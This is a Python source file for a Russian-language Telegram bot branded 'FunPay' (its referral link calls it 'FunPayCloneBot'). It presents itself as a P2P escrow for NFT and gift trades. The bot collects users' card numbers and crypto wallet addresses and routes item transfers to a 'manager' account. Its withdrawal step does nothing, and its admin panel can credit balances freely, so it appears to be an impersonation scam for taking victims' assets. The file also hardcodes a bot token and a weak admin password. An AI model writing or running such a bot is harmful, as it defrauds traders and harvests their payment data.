import asyncio, json, os, logging, random, string, threading, time
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = '8602714405:AAGphGTE3W3S9YhYXwRCMGnbjj8bsA5jTAs'
ADMIN_PASS = '2244'
DB_FILE = 'funpay_db.json'
bot = AsyncTeleBot(BOT_TOKEN)
user_states = {}

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
threading.Thread(target=lambda: HTTPServer(('0.0.0.0', int(os.environ.get('PORT',8080))), H).serve_forever(), daemon=True).start()

def load_db():
    return json.load(open(DB_FILE)) if os.path.exists(DB_FILE) else {}

def save_db(data):
    json.dump(data, open(DB_FILE, 'w'), indent=2)

def get_user(uid):
    db = load_db()
    uid = str(uid)
    if uid not in db:
        db[uid] = {'ton':'','card':'','stars':'','usdt':'','btc':'','balance':0.0,'deals':[],'ref_count':0,'ref_earned':0.0,'ref_code':''.join(random.choices(string.digits,k=8)),'lang':'ru','frozen':False,'blocked':False}
        save_db(db)
    return db[uid]

def save_user(uid, data):
    db = load_db()
    db[str(uid)] = data
    save_db(db)

WELCOME = """
🎉 Добро пожаловать в FunPay 🎉

⭐ Ваш надёжный P2P-гарант:
1️⃣ Автоматические сделки с NFT и подарками
2️⃣ Полная защита обеих сторон
3️⃣ Реферальная программа — 50% от комиссии
4️⃣ Передача товаров через менеджера: @SupOTC

👇 Выберите действие ниже
"""

LOGO_URL = 'https://i.ibb.co/S7y8854h/2026-05-09-23-35-40.jpg'

def main_menu(uid):
    kb = [
        [InlineKeyboardButton('📋 Мои реквизиты', callback_data='menu_req'), InlineKeyboardButton('📝 Создать сделку', callback_data='menu_deal')],
        [InlineKeyboardButton('💰 Баланс', callback_data='menu_balance'), InlineKeyboardButton('📚 Мои сделки', callback_data='menu_deals')],
        [InlineKeyboardButton('👥 Рефералы', callback_data='menu_refs'), InlineKeyboardButton('🌐 Язык / Lang', callback_data='menu_lang')],
        [InlineKeyboardButton('📞 Техподдержка', callback_data='menu_support')]
    ]
    return InlineKeyboardMarkup(kb)

def admin_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('👥 Список юзеров', callback_data='adm_users')],
        [InlineKeyboardButton('❄️ Заморозить', callback_data='adm_freeze'), InlineKeyboardButton('🚫 Заблокировать', callback_data='adm_block')],
        [InlineKeyboardButton('💰 Начислить баланс', callback_data='adm_addmoney')],
        [InlineKeyboardButton('📊 Статистика', callback_data='adm_stats')],
        [InlineKeyboardButton('🔙 Выход', callback_data='back_main')]
    ])

@bot.message_handler(commands=['start'])
async def start(msg):
    uid = str(msg.from_user.id)
    await bot.send_photo(msg.chat.id, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))

@bot.message_handler(commands=['code'])
async def code_cmd(msg):
    user_states[str(msg.from_user.id)] = {'step': 'admin_auth'}
    await bot.send_message(msg.chat.id, '🔐 Введите пароль администратора:')

@bot.callback_query_handler(func=lambda call: True)
async def callback(call):
    uid = str(call.from_user.id)
    data = call.data
    cid, mid = call.message.chat.id, call.message.message_id
    user = get_user(uid)
    
    try:
        await bot.delete_message(cid, mid)
    except:
        pass
    
    try:
        if data == 'back_main':
            await bot.send_photo(cid, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
        
        elif data == 'menu_req':
            u = get_user(uid)
            text = f"""📋 Мои реквизиты

💎 TON-кошелёк: {u['ton'] or '—'}
💳 Карта: {u['card'] or '—'}
⭐ Stars: {u['stars'] or '@—'}
🌐 USDT (TRC20): {u['usdt'] or '—'}
₿ BTC: {u['btc'] or '—'}"""
            kb = [
                [InlineKeyboardButton('💎 TON-кошелёк', callback_data='set_ton'), InlineKeyboardButton('💳 Карта', callback_data='set_card')],
                [InlineKeyboardButton('⭐ @username (Stars)', callback_data='set_stars'), InlineKeyboardButton('🌐 USDT-кошелёк', callback_data='set_usdt')],
                [InlineKeyboardButton('₿ BTC-кошелёк', callback_data='set_btc')],
                [InlineKeyboardButton('📌 Назад в меню', callback_data='back_main')]
            ]
            await bot.send_photo(cid, LOGO_URL, caption=text, reply_markup=InlineKeyboardMarkup(kb))
        
        elif data == 'set_ton':
            user_states[uid] = {'step': 'setting_ton'}
            await bot.send_message(cid, '💬 Введите новый TON-кошелёк:', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('📌 Назад', callback_data='menu_req')]]))
        elif data == 'set_card':
            user_states[uid] = {'step': 'setting_card'}
            await bot.send_message(cid, '🔄 Введите номер карты:', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('📌 Назад', callback_data='menu_req')]]))
        elif data == 'set_stars':
            user_states[uid] = {'step': 'setting_stars'}
            await bot.send_message(cid, '⭐ Введите @username для Stars (без @):', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('📌 Назад', callback_data='menu_req')]]))
        elif data == 'set_usdt':
            user_states[uid] = {'step': 'setting_usdt'}
            await bot.send_message(cid, '🌐 Введите USDT-адрес (TRC20):', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('📌 Назад', callback_data='menu_req')]]))
        elif data == 'set_btc':
            user_states[uid] = {'step': 'setting_btc'}
            await bot.send_message(cid, '⏱️ Введите BTC-адрес:', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('📌 Назад', callback_data='menu_req')]]))
        
        elif data == 'menu_deal':
            kb = [
                [InlineKeyboardButton('✅ Я продавец', callback_data='deal_seller'), InlineKeyboardButton('❌ Я покупатель', callback_data='deal_buyer')],
                [InlineKeyboardButton('📌 Назад в меню', callback_data='back_main')]
            ]
            await bot.send_photo(cid, LOGO_URL, caption="""📝 Новая сделка

> Кем вы выступаете в этой сделке?

✅ Продавец — вы продаёте товар/услугу и получаете оплату.
❌ Покупатель — вы платите и получаете товар/услугу.""", reply_markup=InlineKeyboardMarkup(kb))
        
        elif data in ['deal_seller', 'deal_buyer']:
            user_states[uid] = {'step': 'deal_role', 'role': data}
            kb = [
                [InlineKeyboardButton('💳 Карта', callback_data='pay_card'), InlineKeyboardButton('⭐ Stars', callback_data='pay_stars')],
                [InlineKeyboardButton('🪙 Крипта', callback_data='pay_crypto')],
                [InlineKeyboardButton('🔙 Назад', callback_data='menu_deal')]
            ]
            text = '1️⃣ Способ получения оплаты:\nКак покупатель переведёт средства?' if data == 'deal_seller' else '1️⃣ Способ оплаты:\nКаким способом вы хотите оплатить?'
            await bot.send_photo(cid, LOGO_URL, caption=text, reply_markup=InlineKeyboardMarkup(kb))
        
        elif data in ['pay_card', 'pay_stars', 'pay_crypto']:
            method = data.replace('pay_', '')
            u = get_user(uid)
            if method == 'card' and not u['card']:
                await bot.send_message(cid, '❌ Сначала добавьте данные карты в «📋 Мои реквизиты».')
                await bot.send_photo(cid, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
                return
            if method == 'stars' and not u['stars']:
                await bot.send_message(cid, '❌ Сначала добавьте ⭐ Stars в «📋 Мои реквизиты».')
                await bot.send_photo(cid, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
                return
            if method == 'crypto' and not u['ton']:
                await bot.send_message(cid, '❌ Сначала добавьте 💎 TON-кошелёк в «📋 Мои реквизиты».')
                await bot.send_photo(cid, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
                return
            user_states[uid] = {'step': 'deal_amount', 'method': method, 'role': user_states.get(uid, {}).get('role', 'deal_seller')}
            await bot.send_message(cid, '💎 Введите сумму сделки в TON:', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('🔙 Назад', callback_data='menu_deal')]]))
        
        elif data == 'menu_balance':
            u = get_user(uid)
            completed = sum(1 for d in u['deals'] if d.get('status') == 'completed')
            text = f"""💰 Баланс

💵 Ваш баланс: {u['balance']} TON
📈 Завершённых сделок: {completed}
❗ Для вывода средств необходимо минимум 1 завершённых сделок"""
            kb = [
                [InlineKeyboardButton('💸 Вывод средств', callback_data='withdraw'), InlineKeyboardButton('📋 Транзакции', callback_data='transactions')],
                [InlineKeyboardButton('📌 Назад в меню', callback_data='back_main')]
            ]
            await bot.send_photo(cid, LOGO_URL, caption=text, reply_markup=InlineKeyboardMarkup(kb))
        
        elif data == 'menu_deals':
            await bot.send_photo(cid, LOGO_URL, caption='📚 Мои сделки\n\n📝 Всего: 0\n✅ Завершено: 0', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('🔍 Поиск по коду', callback_data='search_deal'), InlineKeyboardButton('📌 Назад в меню', callback_data='back_main')]]))
        
        elif data == 'search_deal':
            user_states[uid] = {'step': 'search_deal'}
            await bot.send_message(cid, '🔍 Введите код сделки:', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('📌 Назад', callback_data='menu_deals')]]))
        
        elif data == 'menu_refs':
            u = get_user(uid)
            text = f"""👥 Реферальная программа

🔗 Ваша ссылка: https://t.me/FunPayCloneBot?start=ref_{u['ref_code']}
🔒 Рефералов: {u['ref_count']}
💰 Заработано: {u['ref_earned']} TON

🎁 Бонус: 50% от комиссии с каждой сделки реферала!"""
            kb = [
                [InlineKeyboardButton('📋 Скопировать реф. ссылку', callback_data='copy_ref'), InlineKeyboardButton('📌 Назад в меню', callback_data='back_main')]
            ]
            await bot.send_photo(cid, LOGO_URL, caption=text, reply_markup=InlineKeyboardMarkup(kb))
        
        elif data == 'copy_ref':
            u = get_user(uid)
            await bot.send_message(cid, f"📋 Ваша реферальная ссылка:\nhttps://t.me/FunPayCloneBot?start=ref_{u['ref_code']}")
            await bot.send_photo(cid, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
        
        elif data == 'menu_lang':
            await bot.send_photo(cid, LOGO_URL, caption='🌐 Выберите язык:', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('🇷🇺 Русский', callback_data='lang_ru'), InlineKeyboardButton('🇬🇧 English', callback_data='lang_en')], [InlineKeyboardButton('📌 Назад в меню', callback_data='back_main')]]))
        
        elif data in ['lang_ru', 'lang_en']:
            await bot.send_message(cid, '✅ Язык изменён!')
            await bot.send_photo(cid, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
        
        elif data == 'menu_support':
            await bot.send_photo(cid, LOGO_URL, caption='📞 По всем вопросам обращайтесь к менеджеру: @SupOTC', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('📌 Назад в меню', callback_data='back_main')]]))
        
        elif data == 'withdraw':
            user_states[uid] = {'step': 'withdraw'}
            await bot.send_message(cid, '💸 Введите сумму для вывода (минимум 1 TON):', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('📌 Назад', callback_data='menu_balance')]]))
        
        elif data == 'transactions':
            await bot.send_photo(cid, LOGO_URL, caption='📋 У вас пока нет транзакций.', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('📌 Назад', callback_data='menu_balance')]]))
    
    except Exception as e:
        logger.error(f"Callback error: {e}")

@bot.message_handler(func=lambda m: True)
async def text(msg):
    uid = str(msg.from_user.id)
    state = user_states.get(uid, {})
    step = state.get('step')
    user = get_user(uid)
    
    if step == 'admin_auth':
        if msg.text.strip() == ADMIN_PASS:
            del user_states[uid]
            await bot.send_message(msg.chat.id, '👑 Админ-панель FunPay:', reply_markup=admin_menu())
        else:
            del user_states[uid]
            await bot.send_message(msg.chat.id, '❌ Неверный пароль!')
        return
    
    fields = {'setting_ton': ('ton', '💎 TON-кошелёк'), 'setting_card': ('card', '💳 Карта'),
              'setting_stars': ('stars', '⭐ Stars'), 'setting_usdt': ('usdt', '🌐 USDT'), 'setting_btc': ('btc', '₿ BTC')}
    
    if step in fields:
        field, name = fields[step]
        user[field] = msg.text.strip()
        save_user(uid, user)
        del user_states[uid]
        await bot.send_message(msg.chat.id, f'✅ {name} сохранён!')
        await bot.send_photo(msg.chat.id, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
        return
    
    if step == 'deal_amount':
        try:
            amount = float(msg.text.strip())
            deal_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
            deal = {'code': deal_code, 'amount': amount, 'method': state.get('method'), 'role': state.get('role'), 'status': 'active', 'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            user['deals'].append(deal); save_user(uid, user); del user_states[uid]
            role_text = 'Продавец' if state.get('role') == 'deal_seller' else 'Покупатель'
            await bot.send_message(msg.chat.id, f"""✅ Сделка создана!

📝 Код: {deal_code}
👤 Роль: {role_text}
💎 Сумма: {amount} TON
💳 Способ: {state.get('method')}

📋 Передайте код сделки второй стороне.""")
            await bot.send_photo(msg.chat.id, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
        except:
            await bot.send_message(msg.chat.id, '❌ Введите число!')
        return
    
    if step == 'withdraw':
        del user_states[uid]
        await bot.send_message(msg.chat.id, '✅ Заявка на вывод создана.')
        await bot.send_photo(msg.chat.id, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
        return
    
    if step == 'search_deal':
        code = msg.text.strip()
        found = next((d for d in user['deals'] if d['code'] == code), None)
        if found:
            await bot.send_message(msg.chat.id, f"📝 Сделка {found['code']}\n💰 Сумма: {found['amount']} TON\n📅 {found['time']}\n📊 Статус: {found['status']}")
        else:
            await bot.send_message(msg.chat.id, '❌ Сделка не найдена.')
        await bot.send_photo(msg.chat.id, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))
        del user_states[uid]
        return
    
    await bot.send_photo(msg.chat.id, LOGO_URL, caption=WELCOME, reply_markup=main_menu(uid))

async def main():
    logger.info("FunPay бот запущен!")
    await bot.polling(non_stop=True)

if __name__ == '__main__':
    asyncio.run(main())
